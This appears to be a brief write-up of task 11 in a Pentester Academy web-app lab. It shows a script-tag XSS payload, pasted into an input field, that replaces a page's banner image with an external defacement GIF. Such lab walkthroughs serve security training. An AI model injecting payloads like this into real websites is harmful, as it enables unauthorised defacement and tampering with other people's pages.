## Task 11 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/11)</small>

Objectives:

1. Replace the Pentester Academy Banner image with a Defacement Image

This is damn easy, I don't know why vivek has kept this at 11 number 😛. Well in this we need to change the source url of the image tag.

The value of input tag is rendered in the `<h2>` tag

```html
<script>
  document.querySelector("img").src =
    "https://cdn.theatlantic.com/thumbor/9u-u7nYP2JNVKNvfVlLzdCmq6_U=/0x50:960x590/720x405/media/img/mt/2016/10/banner-3/original.gif";
</script>
```

For POC, paste the above payload in the input field and hit enter
